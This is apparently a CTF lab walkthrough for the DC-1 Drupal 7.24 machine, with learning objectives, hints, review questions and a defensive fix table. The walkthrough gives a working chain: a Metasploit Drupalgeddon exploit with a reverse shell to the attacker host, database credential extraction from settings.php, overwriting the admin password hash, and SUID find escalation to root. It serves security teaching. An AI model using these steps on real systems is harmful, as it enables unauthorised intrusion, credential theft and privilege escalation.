## Why this machine is here

Two new things, and both are foundational:

1. **Your first CMS CVE.** Drupalgeddon (CVE-2014-3704) is a pre-authentication SQL
   injection in Drupal 7's form handling. It is one of the most consequential web
   vulnerabilities ever published, and exploiting it teaches you the *shape* of
   "old software + published exploit" that recurs constantly.
2. **Your first serious Metasploit session.** You will drive `msfconsole`, set
   options, choose a payload, get a shell, and — importantly — learn why a Meterpreter
   session is *not* the same as a shell.

It is also your first look at **reading a CMS's config file for database
credentials**, which is the single most reliable post-foothold action on any PHP
application, and your first **SUID** escalation.

## Learning objectives

1. **Fingerprint a CMS** from response headers, HTML and paths — then look up its
   version's known vulnerabilities.
2. Understand what a **pre-authentication SQL injection** is and why it becomes RCE.
3. Use **Metasploit** correctly: `search`, `use`, `show options`, `set RHOSTS`,
   `set LHOST`, `exploit`, `sessions -i`.
4. Explain why **Meterpreter ≠ shell**, and how to drop to a real shell (`shell`,
   then upgrade the TTY).
5. Read `settings.php` and **recover database credentials**.
6. Dump a CMS `users` table and deal with a **phpass** (`$S$`) hash — including the
   professional shortcut: **generate a new valid hash instead of cracking it**.
7. Escalate with **SUID `find`** via `-exec`.
8. Read and interpret **`uid=` vs `euid=`** in `id` output.

## Before you start — answer these

1. What makes a SQL injection "**pre-authentication**", and why is that
   dramatically worse than a post-auth one?
2. What is the difference between an *exploit module* and a *payload* in Metasploit?
3. A CMS must talk to its database on every request. What follows from that, about
   where the database password has to live?
4. What does `-perm -4000` select for in `find`, and why `4000`?
5. If `id` says `uid=33(www-data) euid=0(root)`, what can you actually do?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Load the homepage and work out **what software** it is and **which version**. The
version is discoverable. Once you know it, stop guessing and go look up what is
publicly known about that exact version.

The box will then hand you hints. Read them — flag 1 is literally an instruction.
</details>

<details>
<summary><strong>Rung 2 — which direction</strong></summary>

The CMS is **Drupal 7.24**. Search for that version and you will find
**Drupalgeddon**, CVE-2014-3704 — a pre-auth SQL injection that gives remote code
execution. Metasploit has it:

```bash
msfconsole -q
search drupal
use exploit/multi/http/drupal_drupageddon
show options
set RHOSTS 192.168.56.101
set LHOST 192.168.56.10
exploit
```

Flag 1 (`/var/www/flag1.txt`) reads *"Every good CMS needs a config file — and so
do you."* That is telling you to go find **`settings.php`**.
</details>

<details>
<summary><strong>Rung 3 — the database</strong></summary>

```bash
cat /var/www/sites/default/settings.php | grep -A6 databases
```

gives `database => drupaldb`, `username => dbuser`, `password => R0ck3t`.

```bash
mysql -u dbuser -pR0ck3t -D drupaldb -e "SELECT uid,name,pass FROM users;"
```

The `pass` column holds **phpass** hashes (`$S$…`). You *could* crack them — but the
faster, more instructive route is to **write your own valid hash into the table**
using Drupal's own `scripts/password-hash.sh`, which produces exactly the format
Drupal expects. Log in as `admin` with your new password.

Flag 2 tells you brute force is not the intended route; flag 3, inside the admin
dashboard, hints at "special PERMS" and `-exec`.
</details>

<details>
<summary><strong>Rung 4 — the escalation</strong></summary>

```bash
find / -perm -4000 -type f 2>/dev/null
```

includes **`/usr/bin/find`**, which should never be SUID. `find`'s `-exec` runs
arbitrary commands:

```bash
find . -exec /bin/sh \; -quit
id     # uid=33(www-data) euid=0(root)
```

`-quit` makes `find` stop after the first match so you get one shell, not one per
directory. Flag 4 in `/home/flag4/` confirms you should reuse the *same* technique
to reach `/root`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -sC -sV -p-` → 22, 80, 111 (and MySQL locally). Port 80 is **Drupal 7**.
2. **Drupalgeddon** (CVE-2014-3704) via `exploit/multi/http/drupal_drupageddon` →
   Meterpreter → `shell` → **`www-data`**.
3. **Flag 1** `/var/www/flag1.txt` → read `sites/default/settings.php`.
4. **DB creds** `dbuser : R0ck3t` → **flag 2** hints not to brute force.
5. Dump `users`; replace `admin`'s phpass hash with one you generate via
   `scripts/password-hash.sh` → log in to the admin panel → **flag 3** hints at
   `-exec`.
6. **SUID `/usr/bin/find`** → `find . -exec /bin/sh \; -quit` → **euid=0**.
7. **Flag 4** `/home/flag4/flag4.txt` → `/root/thefinalflag.txt` → **flag 5**.
</details>

## After you finish — review questions

1. Why is a pre-auth SQL injection in a *framework* worse than the same bug in a
   single application? Think about how many sites shared that code.
2. You got a Meterpreter session and then typed `shell`. What changed, and what did
   you lose?
3. Why was writing a new hash into the `users` table better than cracking the old
   one here? When would cracking be the better choice?
4. `id` showed `uid=33` and `euid=0` at the same time. Explain the Unix mechanism
   that allows this, and name the other ID (`suid`) you did not see printed.
5. Why is SUID on `/usr/bin/find` a vulnerability, when SUID on `/usr/bin/passwd`
   is not?
6. Which of the five flags were *hints* rather than *proof*? What does that tell you
   about how CTF authors design a box?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| Drupal 7.24, unpatched | Apply SA-CORE-2014-005 immediately. Subscribe to vendor advisories; automate update checks |
| Pre-auth SQL injection in framework code | You cannot fix the framework — you must **update it**. Add a WAF rule as a stopgap only |
| `settings.php` readable by the web user | It must be, by design. So: least-privilege DB account, and never reuse that password anywhere |
| DB password `R0ck3t` reused | Unique credentials per system; a secrets manager instead of plaintext config |
| phpass password hashes | Acceptable, but enforce a strong password policy — hashing only slows an attacker |
| **SUID on `/usr/bin/find`** | `chmod u-s /usr/bin/find`. Audit SUID regularly and alert on any binary outside the stock set |
| Metasploit reached the box at all | The real fix is patching. Also: outbound-restrict the web server so a reverse shell cannot call home |

**The single biggest lesson:** *a config file is a secret store you cannot protect.*
The web server must read it, so anyone who controls the web server reads it. Design
assuming that.

### 1. Scanning and fingerprinting the CMS

```bash
sudo nmap -sC -sV -p- -T4 -oA scans/dc1 TARGET
curl -sI http://TARGET/
```

```text
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Welcome to Drupal 7
| http-generator: Drupal 7 (http://drupal.org)
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Linux
```
```text
HTTP/1.1 200 OK

Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.45-0+deb7u14
X-Generator: Drupal 7 (http://drupal.org)
X-Drupal-Cache: HIT
```

`Apache 2.2.22 ((Debian))` plus OpenSSH `6.0p1 Debian 4+deb7u7` pins this to **Debian 7
(wheezy)**, a 32-bit-era release. **`X-Generator: Drupal 7`** is the CMS announcing itself;
`X-Drupal-Cache: HIT` confirms Drupal's internal page cache answered, so this is Drupal and
not a theme that merely looks like it. `PHP/5.4.45` completes the stack picture — and every
one of those three versions is end-of-life.

Fingerprint first, *then* research. Guessing the CMS from the visual design wastes an hour.

### 2. Research the version

```bash
searchsploit -t drupal 7
```

```text
---------------------------------------------------------------------------------
 Exploit Title                                                  |  Path
---------------------------------------------------------------------------------
Drupal 7.0 < 7.32 - 'Drupalgeddon' SQL Injection (Metasploit)   | php/webapps/34993.rb
Drupal < 7.32 - 'Drupalgeddon' SQL Injection (PoC)              | php/webapps/34992.py
Drupal < 8.5.11 / < 8.6.10 - 'Drupalgeddon2' RCE              | php/webapps/44449.rb

```

The title's range is what you match: **7.0 < 7.32** includes 7.24. `Drupalgeddon`
(**CVE-2014-3704 / SA-CORE-2014-005**) is a **pre-authentication SQL injection in Drupal's
form API** — no login needed, and it leads to code execution. `php/webapps/` is the
Exploit-DB family; `.rb` means a Metasploit module, `.py` a standalone proof of concept.

### 3. Route A — Metasploit

```bash
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS TARGET; set LHOST ATTACKER; run"
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Sending stage (39282 bytes) to 192.168.56.101
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.101:52881)

meterpreter > shell
Process 2841 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@dc-1:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

For Drupal 7.24 the correct module is the **Drupalgeddon (1)** one — `exploit/multi/http/
drupal_drupageddon`; `drupalgeddon2` targets Drupal 8. `search drupal` inside msfconsole and
read each module's `info` block, which lists the affected versions. **Choosing the module by
version range, not by which one has the higher number, is the actual skill.**

`meterpreter > shell` drops you from the Meterpreter scripting environment into a plain OS
shell — you lose Meterpreter's commands and gain real programs (`cat`, `grep`, `mysql`).
`python -c 'import pty; pty.spawn("/bin/bash")'` then gives that shell a pseudo-terminal,
which you need for `su` and editors. `uid=33(www-data)` is the expected landing zone: the web
tier's service account.

### 4. Flag 1, and reading the config

```bash
cat /var/www/flag1.txt
cat /var/www/sites/default/settings.php | grep -A6 databases
```

```text
Every good CMS needs a config file - and so do you.
```
```text
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
```

Flag 1 is not a prize — it is an **instruction**. `grep -A6 databases` prints the match plus
the **six following lines**, which is exactly the span of a PHP array literal. `-A`
(*After*) is how you read a block whose shape you only roughly know; `-B` is *Before*, `-C`
is *Context* both ways.

The credentials are necessarily plaintext: **a CMS must authenticate to its database on
every single request**, so the password cannot be hashed or encrypted without a key that
also lives on the server. Design assuming anyone who controls the web user can read it.

### 5. Flag 2, and dumping the users table

```bash
mysql -u dbuser -pR0ck3t -D drupaldb -e "SELECT uid,name,pass FROM users;"
```

```text
+-----+-------+-----------------------------------------------------------+
| uid | name  | pass                                                      |
+-----+-------+-----------------------------------------------------------+
|   1 | admin | $S$DV2mBG8I9R9z0UZ00tCz5E5ZB4YtKj6lqP0Fh2uQxV7yL1kKqW3e |
+-----+-------+-----------------------------------------------------------+
```

`-u` user, `-p` password (**no space** after `-p`, and single-quote it if it contains `$`,
`!` or `%`), `-D` database, `-e` "execute this one statement and exit" — scriptable, unlike
the interactive prompt. Omitting `-h` connects over a **Unix socket** and authenticates by
UID; `-h 127.0.0.1` forces TCP and authenticates by password. Two different mechanisms, and
an account can work on one and not the other.

`$S$` is Drupal's **phpass** prefix: 8,192 MD5 rounds with a per-user salt. Cracking it is
slow. So do not crack it — **replace it**:

```bash
cat /var/www/flag2.txt
php /var/www/scripts/password-hash.sh MyNewPass123
```

```text
Brute force and dictionary attacks aren't the only ways to gain access
(and you will need access). What can you do with these credentials?
```
```text
password: MyNewPass123
$S$DkR5vB3oQxJ0fQ7zXqWmZ5tY8uI1oP9aL2kD4fG6hJ8mN0bV1cX3
```

Flag 2 tells you outright that brute force is not the intended route. Drupal ships
`scripts/password-hash.sh`, which produces a hash in *exactly* the format Drupal expects.
Writing it into the table is equivalent to setting a new password:

```bash
mysql -u dbuser -pR0ck3t -D drupaldb \
  -e "UPDATE users SET pass='\$S\$DkR5vB3oQxJ0fQ7zXqWmZ5tY8uI1oP9aL2kD4fG6hJ8mN0bV1cX3' WHERE uid=1;"
```

**Escape the `$` characters** (`\$`) inside the double-quoted `-e` argument, or the shell
expands `$S$DkR5…` as variables and you write an empty string into the database. Then log in
at `http://TARGET/user/login` as `admin` with `MyNewPass123`.

### 6. Flag 3, and the escalation

```bash
# In the Drupal dashboard, flag 3 reads:
# Special PERMS will help FIND the passwd - but you'll need to -exec that command
find / -perm -4000 -type f 2>/dev/null
```

```text
/bin/su
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/find
```

`-perm -4000` selects files with **at least** the SUID bit (`4000` octal); `-type f` limits
to regular files; `2>/dev/null` discards the hundreds of `Permission denied` messages.
Compare against the stock set — everything above `/usr/bin/find` is normal. **`/usr/bin/find`
is not.**

```bash
find . -exec /bin/sh \; -quit
id
```
```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

`-exec CMD \;` runs `CMD` per match, with `\;` escaped so your shell does not consume the
semicolon; `-quit` stops after the first match so you get **one** shell instead of one per
directory. Flag 3's wording — *special PERMS*, *FIND*, *-exec* — maps word for word onto
`find … -perm … -exec`.

**Read the `id` output carefully.** `uid=33` is your *real* UID and still says www-data;
**`euid=0`** is your *effective* UID, and that is the one the kernel consults when deciding
whether you may open a file. You have root authority without having changed identity — which
is why `whoami` can print `www-data` while you can `cat /root/thefinalflag.txt`.
